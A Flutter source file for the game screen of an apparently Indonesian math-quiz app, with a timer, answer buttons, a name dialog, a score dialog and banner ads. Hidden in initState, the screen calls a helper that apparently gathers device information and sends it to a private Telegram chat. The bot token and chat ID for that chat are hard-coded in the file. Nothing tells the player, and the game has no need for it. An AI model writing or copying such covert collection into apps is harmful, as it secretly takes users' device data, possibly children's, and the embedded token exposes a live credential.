import 'package:belajar_matika/providers/ads_provider.dart';
import 'package:belajar_matika/providers/matika/game_provider.dart';
import 'package:belajar_matika/providers/matika/timer_providers.dart';
import 'package:belajar_matika/providers/matika/user_provider.dart';
import 'package:belajar_matika/utils/device_info_helper.dart';
import 'package:belajar_matika/utils/sound_helper.dart';
import 'package:belajar_matika/utils/tele_helper.dart';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_mobile_ads/google_mobile_ads.dart';
import 'package:logger/logger.dart';

class GameScreen extends ConsumerStatefulWidget {
  const GameScreen({super.key});

  @override
  ConsumerState<GameScreen> createState() => _GameScreenState();
}

class _GameScreenState extends ConsumerState<GameScreen> {
  bool dialogShown = false;
  bool gameExited = false;

  final DeviceInfoHelper deviceInfoHelper = DeviceInfoHelper(
    telegramHelper: TelegramHelper(
      botToken:
          '7678341666:AAH_6GTin6WCzxx0zOoySoeZfz6b8FgRfFU', // Ganti dengan token bot Anda
      chatId: '111519789', // Ganti dengan chat ID Anda
    ),
  );
  bool isLoading = true;

  @override
  void initState() {
    super.initState();
    _loadAndSendDeviceInfo();
    // Inisialisasi state atau logika lainnya bisa dilakukan di sini
  }

  Future<void> _loadAndSendDeviceInfo() async {
    try {
      await deviceInfoHelper.getAndSendDeviceInfo();
      setState(() {
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        isLoading = false;
      });
      Logger().e(e);
    }
  }

  void showNameDialog(BuildContext context, WidgetRef ref) {
    TextEditingController nameController = TextEditingController();

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        title: const Text("Masukkan Nama Anda"),
        content: TextField(
          controller: nameController,
          decoration: const InputDecoration(hintText: "Nama"),
        ),
        actions: [
          TextButton(
            onPressed: () {
              if (nameController.text.isNotEmpty) {
                ref.read(userProvider.notifier).state =
                    nameController.text; // Simpan username
                Navigator.of(context).pop();
                ref
                    .read(gameProvider.notifier)
                    .startGame(); // Mulai game setelah nama diisi
              }
            },
            child: const Text("Mulai"),
          ),
        ],
      ),
    );
  }

  void startGame(BuildContext context, WidgetRef ref) {
    if (ref.read(userProvider).isEmpty) {
      showNameDialog(context, ref); // Minta nama dulu
    } else {
      ref
          .read(gameProvider.notifier)
          .startGame(); // Jika nama sudah ada, langsung mulai
    }
  }

  @override
  Widget build(BuildContext context) {
    final gameState = ref.watch(gameProvider);
    final timer = ref.watch(timerProvider);
    final bannerAd = ref.watch(bannerAdProvider);

    // Tampilkan dialog hanya jika game over
    if (gameState.isGameOver &&
        !dialogShown &&
        !gameExited &&
        (ModalRoute.of(context)?.isCurrent ?? false)) {
      dialogShown = true; // Set flag agar dialog tidak muncul berulang kali

      Future.microtask(() {
        if (!context.mounted) return;
        showDialog(
          context: context,
          barrierDismissible: false,
          builder: (_) => AlertDialog(
            title: const Text("Game Over!", textAlign: TextAlign.center),
            content: Text(
              "Skor Akhir: ${gameState.score}\n"
              "Kesalahan: ${gameState.mistakes}\n"
              "Waktu Tersisa: ${gameState.timeLeft} detik",
              textAlign: TextAlign.center,
            ),
            actions: [
              TextButton(
                onPressed: () {
                  Navigator.of(context).pop();
                  ref.read(gameProvider.notifier).resetGame();
                  setState(() {
                    gameExited = false;
                    dialogShown =
                        false; // Reset flag agar bisa muncul lagi di permainan berikutnya
                  });
                },
                child: const Text("Main Lagi"),
              ),
            ],
          ),
        );
      });
    }

    return Scaffold(
      appBar: AppBar(
        title: const Text(
          "Tebak Skor",
          style: TextStyle(
            fontWeight: FontWeight.bold,
            fontSize: 20,
          ),
        ),
        backgroundColor: Colors.blueAccent,
        centerTitle: true,
      ),
      body: Container(
        width: double.infinity,
        height: double.infinity,
        padding: const EdgeInsets.all(20),
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            colors: [Colors.blueAccent, Colors.lightBlue],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
        ),
        child: SingleChildScrollView(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              LinearProgressIndicator(
                value: gameState.timeLeft / 60, // Nilai antara 0.0 - 1.0
                backgroundColor: Colors.grey[300],
                color: Colors.red[400],
                minHeight: 5,
              ),
              const SizedBox(
                height: 10,
              ),
              Text(
                "Waktu: ${gameState.timeLeft} detik",
                style: const TextStyle(
                    fontSize: 24,
                    color: Colors.white,
                    fontWeight: FontWeight.bold),
              ),
              // Skor
              const SizedBox(
                height: 20,
              ),
              Container(
                padding:
                    const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
                decoration: BoxDecoration(
                  color: Colors.white,
                  borderRadius: BorderRadius.circular(15),
                  boxShadow: const [
                    BoxShadow(
                      color: Colors.black26,
                      blurRadius: 10,
                      offset: Offset(0, 4),
                    )
                  ],
                ),
                child: Text(
                  "Skor: ${gameState.score}",
                  style: const TextStyle(
                      fontSize: 24,
                      fontWeight: FontWeight.bold,
                      color: Colors.blueAccent),
                ),
              ),
              const SizedBox(height: 20),

              // Timer Animasi
              Stack(
                alignment: Alignment.center,
                children: [
                  SizedBox(
                    width: 80,
                    height: 80,
                    child: CircularProgressIndicator(
                      value: timer / 15,
                      strokeWidth: 8,
                      backgroundColor: Colors.white,
                      valueColor:
                          const AlwaysStoppedAnimation<Color>(Colors.red),
                    ),
                  ),
                  Text(
                    "$timer",
                    style: const TextStyle(
                        fontSize: 28,
                        fontWeight: FontWeight.bold,
                        color: Colors.white),
                  ),
                ],
              ),
              const SizedBox(height: 20),

              // Soal
              Container(
                padding: const EdgeInsets.all(15),
                decoration: BoxDecoration(
                  color: Colors.white,
                  borderRadius: BorderRadius.circular(15),
                  boxShadow: const [
                    BoxShadow(
                      color: Colors.black26,
                      blurRadius: 10,
                      offset: Offset(0, 4),
                    )
                  ],
                ),
                child: Text(
                  gameState.currentQuestion.question,
                  style: const TextStyle(
                      fontSize: 30,
                      fontWeight: FontWeight.bold,
                      color: Colors.black87),
                  textAlign: TextAlign.center,
                ),
              ),
              const SizedBox(height: 10),

              GridView.count(
                shrinkWrap: true,
                crossAxisCount: 2, // 2 kolom
                crossAxisSpacing: 25,
                mainAxisSpacing: 25,
                childAspectRatio: 2.5,
                children: gameState.currentQuestion.options.map((option) {
                  return ElevatedButton(
                    onPressed: () {
                      ref.read(gameProvider.notifier).checkAnswer(option);
                      ref.read(timerProvider.notifier).startTimer();
                      playSound(option == gameState.currentQuestion.answer
                          ? "correct-choice.mp3"
                          : "wrong-sound.mp3");
                    },
                    style: ElevatedButton.styleFrom(
                      padding: const EdgeInsets.symmetric(vertical: 15),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(15),
                      ),
                      backgroundColor: Colors.white,
                      shadowColor: Colors.black45,
                      elevation: 5,
                    ),
                    child: Text(
                      option.toString(),
                      style: const TextStyle(
                        fontSize: 24,
                        fontWeight: FontWeight.bold,
                        color: Colors.blueAccent,
                      ),
                    ),
                  );
                }).toList(),
              ),
              const SizedBox(
                height: 10,
              ),
              ElevatedButton(
                onPressed: () => startGame(context, ref),
                child: const Text("Mulai Game"),
              ),
              const SizedBox(
                height: 10,
              ),
              if (bannerAd != null &&
                  bannerAd.responseInfo !=
                      null) // 🔹 Menampilkan Banner Ads jika berhasil dimuat
                SizedBox(
                  height: bannerAd.size.height.toDouble(),
                  width: bannerAd.size.width.toDouble(),
                  child: AdWidget(ad: bannerAd),
                ),
            ],
          ),
        ),
      ),
    );
  }
}
